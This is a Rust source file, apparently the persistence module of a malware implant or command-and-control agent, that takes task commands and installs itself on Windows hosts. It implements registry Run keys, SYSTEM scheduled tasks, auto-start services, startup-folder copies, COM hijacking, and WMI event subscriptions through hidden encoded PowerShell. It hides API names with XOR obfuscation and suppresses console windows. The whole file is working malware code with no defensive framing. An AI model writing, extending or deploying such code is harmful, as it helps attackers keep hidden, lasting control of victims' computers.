//! Persistence — Phase 4.
//! Task type: "persist", args: {"method": "<name>", ...}

use crate::task::{Task, TaskOutput};

pub fn exec_persist(task: &Task) -> TaskOutput {
    #[cfg(target_os = "windows")]
    return exec_persist_win(task);
    #[cfg(not(target_os = "windows"))]
    TaskOutput::failure("persist: Windows only")
}

#[cfg(target_os = "windows")]
fn exec_persist_win(task: &Task) -> TaskOutput {
    let args = match task.args.as_deref() {
        Some(a) => a,
        None    => return TaskOutput::failure("persist: no args"),
    };
    let v: serde_json::Value = match serde_json::from_slice(args) {
        Ok(v)  => v,
        Err(e) => return TaskOutput::failure(&format!("persist: {e}")),
    };
    match v.get("method").and_then(|m| m.as_str()).unwrap_or("") {
        "reg"       => persist_reg(&v),
        "task"      => persist_task(&v),
        "svc"       => persist_svc(&v),
        "startup"   => persist_startup(&v),
        "com"       => persist_com(&v),
        "wmi"       => persist_wmi(&v),
        "reg-rm"    => persist_reg_remove(&v),
        "svc-rm"    => persist_svc_remove(&v),
        other => TaskOutput::failure(&format!("persist: unknown method: {other}")),
    }
}

// ── Registry Run key (HKCU) ───────────────────────────────────────────────────

#[cfg(target_os = "windows")]
fn persist_reg(v: &serde_json::Value) -> TaskOutput {
    let name = match v.get("name").and_then(|s| s.as_str()) { Some(s) => s, None => return TaskOutput::failure("persist/reg: missing name") };
    let path = match v.get("path").and_then(|s| s.as_str()) { Some(s) => s, None => return TaskOutput::failure("persist/reg: missing path") };
    let hive  = v.get("hive").and_then(|s| s.as_str()).unwrap_or("hkcu");

    let subkey = "Software\\Microsoft\\Windows\\CurrentVersion\\Run";
    match reg_set(hive, subkey, name, path) {
        Ok(()) => TaskOutput::success(format!("persist/reg: set {hive}\\{subkey}\\{name}").into_bytes()),
        Err(e) => TaskOutput::failure(&format!("persist/reg: {e}")),
    }
}

#[cfg(target_os = "windows")]
fn persist_reg_remove(v: &serde_json::Value) -> TaskOutput {
    let name = match v.get("name").and_then(|s| s.as_str()) { Some(s) => s, None => return TaskOutput::failure("persist/reg-rm: missing name") };
    let hive = v.get("hive").and_then(|s| s.as_str()).unwrap_or("hkcu");
    let subkey = "Software\\Microsoft\\Windows\\CurrentVersion\\Run";
    match reg_del_value(hive, subkey, name) {
        Ok(()) => TaskOutput::success(b"persist/reg: removed".to_vec()),
        Err(e) => TaskOutput::failure(&format!("persist/reg-rm: {e}")),
    }
}

// ── Scheduled task (via schtasks.exe) ────────────────────────────────────────

#[cfg(target_os = "windows")]
fn persist_task(v: &serde_json::Value) -> TaskOutput {
    let name    = match v.get("name").and_then(|s| s.as_str()) { Some(s) => s, None => return TaskOutput::failure("persist/task: missing name") };
    let path    = match v.get("path").and_then(|s| s.as_str()) { Some(s) => s, None => return TaskOutput::failure("persist/task: missing path") };
    let trigger = v.get("trigger").and_then(|s| s.as_str()).unwrap_or("ONLOGON");
    let user    = v.get("user").and_then(|s| s.as_str()).unwrap_or("SYSTEM");

    let cmd = format!(
        "schtasks /Create /TN \"{name}\" /TR \"{path}\" /SC {trigger} /RU \"{user}\" /F"
    );
    shell_run(&cmd)
        .map(|out| TaskOutput::success(out))
        .unwrap_or_else(|e| TaskOutput::failure(&e))
}

// ── Service persistence ───────────────────────────────────────────────────────

#[cfg(target_os = "windows")]
fn persist_svc(v: &serde_json::Value) -> TaskOutput {
    let name = match v.get("name").and_then(|s| s.as_str()) { Some(s) => s, None => return TaskOutput::failure("persist/svc: missing name") };
    let disp = v.get("display").and_then(|s| s.as_str()).unwrap_or(name);
    let path = match v.get("path").and_then(|s| s.as_str()) { Some(s) => s, None => return TaskOutput::failure("persist/svc: missing path") };

    let adv = adv_base();
    if adv == 0 { return TaskOutput::failure("persist/svc: advapi32 not found"); }

    type OpenSCMFn       = unsafe extern "system" fn(*const u8, *const u8, u32) -> isize;
    type CreateSvcAFn    = unsafe extern "system" fn(isize,*const u8,*const u8,u32,u32,u32,u32,*const u8,*const u8,*mut u32,*const u8,*const u8,*const u8) -> isize;
    type CloseHandleSvcFn = unsafe extern "system" fn(isize) -> i32;

    let p_open   = unsafe { adv_fn(adv, &[0x15,0x2A,0x3F,0x34,0x09,0x19,0x17,0x3B,0x34,0x3B,0x3D,0x3F,0x28,0x1B,0x5A]) };
    let p_create = unsafe { adv_fn(adv, &[0x19,0x28,0x3F,0x3B,0x2E,0x3F,0x09,0x3F,0x28,0x2C,0x33,0x39,0x3F,0x1B,0x5A]) };
    let p_close  = unsafe { adv_fn(adv, &[0x19,0x36,0x35,0x29,0x3F,0x09,0x3F,0x28,0x2C,0x33,0x39,0x3F,0x12,0x3B,0x34,0x3E,0x36,0x3F,0x5A]) };

    let (fn_open, fn_create, fn_close) = match (p_open, p_create, p_close) {
        (Some(a), Some(b), Some(c)) => (
            unsafe { core::mem::transmute::<_, OpenSCMFn>(a) },
            unsafe { core::mem::transmute::<_, CreateSvcAFn>(b) },
            unsafe { core::mem::transmute::<_, CloseHandleSvcFn>(c) },
        ),
        _ => return TaskOutput::failure("persist/svc: fn resolve failed"),
    };

    const SC_MANAGER_ALL_ACCESS: u32 = 0xF003F;
    const SERVICE_WIN32_OWN_PROCESS: u32 = 0x10;
    const SERVICE_AUTO_START: u32 = 0x02;
    const SERVICE_ERROR_NORMAL: u32 = 0x01;
    const SERVICE_ALL_ACCESS: u32 = 0xF01FF;

    let scm = unsafe { fn_open(core::ptr::null(), core::ptr::null(), SC_MANAGER_ALL_ACCESS) };
    if scm == 0 { return TaskOutput::failure("persist/svc: OpenSCManager failed"); }

    let svc_name = match std::ffi::CString::new(name) { Ok(c) => c, Err(_) => { unsafe { fn_close(scm) }; return TaskOutput::failure("persist/svc: bad name"); } };
    let svc_disp = match std::ffi::CString::new(disp) { Ok(c) => c, Err(_) => { unsafe { fn_close(scm) }; return TaskOutput::failure("persist/svc: bad disp"); } };
    let svc_path = match std::ffi::CString::new(path) { Ok(c) => c, Err(_) => { unsafe { fn_close(scm) }; return TaskOutput::failure("persist/svc: bad path"); } };

    let svc = unsafe { fn_create(
        scm,
        svc_name.as_ptr() as *const u8,
        svc_disp.as_ptr() as *const u8,
        SERVICE_ALL_ACCESS,
        SERVICE_WIN32_OWN_PROCESS,
        SERVICE_AUTO_START,
        SERVICE_ERROR_NORMAL,
        svc_path.as_ptr() as *const u8,
        core::ptr::null(), core::ptr::null_mut(), core::ptr::null(), core::ptr::null(), core::ptr::null(),
    )};
    unsafe { fn_close(scm) };

    if svc == 0 {
        TaskOutput::failure("persist/svc: CreateService failed")
    } else {
        unsafe { fn_close(svc) };
        TaskOutput::success(format!("persist/svc: created service '{name}'").into_bytes())
    }
}

#[cfg(target_os = "windows")]
fn persist_svc_remove(v: &serde_json::Value) -> TaskOutput {
    let name = match v.get("name").and_then(|s| s.as_str()) { Some(s) => s, None => return TaskOutput::failure("persist/svc-rm: missing name") };
    let cmd = format!("sc delete \"{name}\"");
    shell_run(&cmd)
        .map(|out| TaskOutput::success(out))
        .unwrap_or_else(|e| TaskOutput::failure(&e))
}

// ── Startup folder persistence ────────────────────────────────────────────────

#[cfg(target_os = "windows")]
fn persist_startup(v: &serde_json::Value) -> TaskOutput {
    let src  = match v.get("src").and_then(|s| s.as_str()) { Some(s) => s, None => return TaskOutput::failure("persist/startup: missing src") };
    let name = match v.get("name").and_then(|s| s.as_str()) { Some(s) => s, None => return TaskOutput::failure("persist/startup: missing name") };

    let appdata = std::env::var("APPDATA").unwrap_or_default();
    let dest = format!("{appdata}\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\{name}");

    match std::fs::copy(src, &dest) {
        Ok(_)  => TaskOutput::success(format!("persist/startup: copied to {dest}").into_bytes()),
        Err(e) => TaskOutput::failure(&format!("persist/startup: {e}")),
    }
}

// ── COM hijack (HKCU InprocServer32) ─────────────────────────────────────────
//
// Writes a DLL path under HKCU\Software\Classes\CLSID\{clsid}\InprocServer32
// so that when any process activates the COM class, our DLL is loaded instead.

#[cfg(target_os = "windows")]
fn persist_com(v: &serde_json::Value) -> TaskOutput {
    let clsid   = match v.get("clsid").and_then(|s| s.as_str()) { Some(s) => s, None => return TaskOutput::failure("persist/com: missing clsid") };
    let dll_path = match v.get("dll").and_then(|s| s.as_str()) { Some(s) => s, None => return TaskOutput::failure("persist/com: missing dll") };

    let subkey = format!("Software\\Classes\\CLSID\\{clsid}\\InprocServer32");
    match reg_set("hkcu", &subkey, "", dll_path) {
        Ok(()) => {}
        Err(e) => return TaskOutput::failure(&format!("persist/com: {e}")),
    }
    match reg_set("hkcu", &subkey, "ThreadingModel", "Apartment") {
        Ok(()) => {}
        Err(e) => return TaskOutput::failure(&format!("persist/com: ThreadingModel: {e}")),
    }
    TaskOutput::success(format!("persist/com: hijacked CLSID {clsid}").into_bytes())
}

// ── WMI subscription (via PowerShell) ────────────────────────────────────────

#[cfg(target_os = "windows")]
fn persist_wmi(v: &serde_json::Value) -> TaskOutput {
    let name = match v.get("name").and_then(|s| s.as_str()) { Some(s) => s, None => return TaskOutput::failure("persist/wmi: missing name") };
    let cmd  = match v.get("cmd").and_then(|s| s.as_str()) { Some(s) => s, None => return TaskOutput::failure("persist/wmi: missing cmd") };

    let ps = format!(
        r#"$f=New-Object -ComObject WScript.Shell;$filter=Set-WmiInstance -Namespace root\subscription -Class __EventFilter -Arguments @{{Name='{name}';EventNameSpace='root\cimv2';QueryLanguage='WQL';Query='SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA ''Win32_PerfFormattedData_PerfOS_System'' AND TargetInstance.SystemUpTime>=120 AND TargetInstance.SystemUpTime<180'}};$consumer=Set-WmiInstance -Namespace root\subscription -Class CommandLineEventConsumer -Arguments @{{Name='{name}';CommandLineTemplate='{cmd}'}};Set-WmiInstance -Namespace root\subscription -Class __FilterToConsumerBinding -Arguments @{{Filter=$filter;Consumer=$consumer}}"#
    );

    let shell_cmd = format!("powershell.exe -NoProfile -NonInteractive -WindowStyle Hidden -EncodedCommand {}", b64_encode_ps(&ps));
    shell_run(&shell_cmd)
        .map(|out| TaskOutput::success(out))
        .unwrap_or_else(|e| TaskOutput::failure(&e))
}

fn b64_encode_ps(cmd: &str) -> String {
    use base64::Engine;
    let utf16: Vec<u8> = cmd.encode_utf16().flat_map(|c| c.to_le_bytes()).collect();
    base64::engine::general_purpose::STANDARD.encode(&utf16)
}

// ── Registry helpers ──────────────────────────────────────────────────────────

#[cfg(target_os = "windows")]
fn adv_base() -> usize {
    crate::loader::get_module_base(
        crate::obfs::dec(&[0x3B,0x3E,0x2C,0x3B,0x2A,0x33,0x69,0x68,0x74,0x3E,0x36,0x36,0x5A]).as_ptr()
    )
}

#[cfg(target_os = "windows")]
unsafe fn adv_fn(base: usize, enc: &[u8]) -> Option<*const u8> {
    crate::loader::get_export_by_name(base, crate::obfs::dec(enc).as_ptr())
}

#[cfg(target_os = "windows")]
fn reg_set(hive: &str, subkey: &str, value_name: &str, data: &str) -> Result<(), String> {
    const HKCU: isize = -2147483647isize;
    const HKLM: isize = -2147483646isize;
    const KEY_WRITE: u32 = 0x20006;
    const REG_SZ: u32 = 1;

    let root = if hive.eq_ignore_ascii_case("hklm") { HKLM } else { HKCU };

    type RegCreateKeyExAFn = unsafe extern "system" fn(isize,*const u8,u32,*const u8,u32,u32,*const u8,*mut isize,*mut u32) -> i32;
    type RegSetValueExAFn  = unsafe extern "system" fn(isize,*const u8,u32,u32,*const u8,u32) -> i32;
    type RegCloseKeyFn     = unsafe extern "system" fn(isize) -> i32;

    let adv = adv_base();
    if adv == 0 { return Err("advapi32 not found".into()); }
    let p_c = unsafe { adv_fn(adv, &[0x08,0x3F,0x3D,0x19,0x28,0x3F,0x3B,0x2E,0x3F,0x11,0x3F,0x23,0x1F,0x22,0x1B,0x5A]) };
    let p_s = unsafe { adv_fn(adv, &[0x08,0x3F,0x3D,0x09,0x3F,0x2E,0x0C,0x3B,0x36,0x2F,0x3F,0x1F,0x22,0x1B,0x5A]) };
    let p_x = unsafe { adv_fn(adv, &[0x08,0x3F,0x3D,0x19,0x36,0x35,0x29,0x3F,0x11,0x3F,0x23,0x5A]) };
    let (fc, fs, fx) = match (p_c, p_s, p_x) {
        (Some(a), Some(b), Some(c)) => (
            unsafe { core::mem::transmute::<_, RegCreateKeyExAFn>(a) },
            unsafe { core::mem::transmute::<_, RegSetValueExAFn>(b) },
            unsafe { core::mem::transmute::<_, RegCloseKeyFn>(c) },
        ),
        _ => return Err("fn resolve failed".into()),
    };

    let sub  = std::ffi::CString::new(subkey).map_err(|e| e.to_string())?;
    let vn   = std::ffi::CString::new(value_name).map_err(|e| e.to_string())?;
    let dat  = std::ffi::CString::new(data).map_err(|e| e.to_string())?;
    let bytes = dat.as_bytes_with_nul();

    let mut hkey: isize = 0;
    let mut disp: u32 = 0;
    let r = unsafe { fc(root, sub.as_ptr() as *const u8, 0, core::ptr::null(), 0, KEY_WRITE, core::ptr::null(), &mut hkey, &mut disp) };
    if r != 0 { return Err(format!("RegCreateKeyEx: {r}")); }

    unsafe { fs(hkey, vn.as_ptr() as *const u8, 0, REG_SZ, bytes.as_ptr(), bytes.len() as u32) };
    unsafe { fx(hkey) };
    Ok(())
}

#[cfg(target_os = "windows")]
fn reg_del_value(hive: &str, subkey: &str, value_name: &str) -> Result<(), String> {
    const HKCU: isize = -2147483647isize;
    const HKLM: isize = -2147483646isize;
    const KEY_WRITE: u32 = 0x20006;

    let root = if hive.eq_ignore_ascii_case("hklm") { HKLM } else { HKCU };

    type RegOpenKeyExAFn   = unsafe extern "system" fn(isize,*const u8,u32,u32,*mut isize) -> i32;
    type RegDeleteValueAFn = unsafe extern "system" fn(isize,*const u8) -> i32;
    type RegCloseKeyFn     = unsafe extern "system" fn(isize) -> i32;

    let adv = adv_base();
    if adv == 0 { return Err("advapi32 not found".into()); }
    let p_o = unsafe { adv_fn(adv, &[0x08,0x3F,0x3D,0x15,0x2A,0x3F,0x34,0x11,0x3F,0x23,0x1F,0x22,0x1B,0x5A]) };
    let p_d = unsafe { adv_fn(adv, &[0x08,0x3F,0x3D,0x1E,0x3F,0x36,0x3F,0x2E,0x3F,0x0C,0x3B,0x36,0x2F,0x3F,0x1B,0x5A]) };
    let p_x = unsafe { adv_fn(adv, &[0x08,0x3F,0x3D,0x19,0x36,0x35,0x29,0x3F,0x11,0x3F,0x23,0x5A]) };
    let (fo, fd, fx) = match (p_o, p_d, p_x) {
        (Some(a), Some(b), Some(c)) => (
            unsafe { core::mem::transmute::<_, RegOpenKeyExAFn>(a) },
            unsafe { core::mem::transmute::<_, RegDeleteValueAFn>(b) },
            unsafe { core::mem::transmute::<_, RegCloseKeyFn>(c) },
        ),
        _ => return Err("fn resolve failed".into()),
    };

    let sub = std::ffi::CString::new(subkey).map_err(|e| e.to_string())?;
    let vn  = std::ffi::CString::new(value_name).map_err(|e| e.to_string())?;
    let mut hkey: isize = 0;
    let r = unsafe { fo(root, sub.as_ptr() as *const u8, 0, KEY_WRITE, &mut hkey) };
    if r != 0 { return Err(format!("RegOpenKeyEx: {r}")); }
    unsafe { fd(hkey, vn.as_ptr() as *const u8) };
    unsafe { fx(hkey) };
    Ok(())
}

fn shell_run(cmd: &str) -> Result<Vec<u8>, String> {
    use std::os::windows::process::CommandExt;
    const CREATE_NO_WINDOW: u32 = 0x08000000;
    match std::process::Command::new("cmd")
        .args(["/C", cmd])
        .creation_flags(CREATE_NO_WINDOW)
        .output()
    {
        Ok(o)  => { let mut d = o.stdout; d.extend_from_slice(&o.stderr); Ok(d) }
        Err(e) => Err(e.to_string()),
    }
}
